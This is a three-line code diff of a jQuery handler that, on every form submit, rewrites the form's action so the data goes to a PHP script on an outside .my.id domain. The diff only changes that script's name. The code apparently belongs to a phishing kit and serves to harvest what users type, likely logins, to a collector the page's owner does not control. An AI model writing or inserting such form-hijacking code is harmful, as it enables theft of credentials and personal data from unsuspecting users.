@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://romusa-sabose-santos.my.id/mister.php");
+  $(myform).attr("action", "https://romusa-sabose-santos.my.id/bejo.php");
 });
